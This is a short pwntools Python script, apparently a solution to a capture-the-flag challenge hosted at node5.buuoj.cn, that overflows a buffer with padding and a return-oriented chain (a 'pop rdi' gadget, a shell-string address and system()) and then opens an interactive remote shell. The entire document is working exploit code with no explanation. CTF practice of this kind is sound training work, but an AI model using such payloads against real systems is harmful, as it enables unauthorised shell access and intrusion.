from pwn import *


system_addr = 0x400490
bash_addr = 0x601048
pop_rdi = 0x400683

r = remote('node5.buuoj.cn', 27072)

payload = b'A' * 0x10 + p64(0) + p64(pop_rdi) + p64(bash_addr) + p64(system_addr)

r.sendline(payload)
r.interactive()
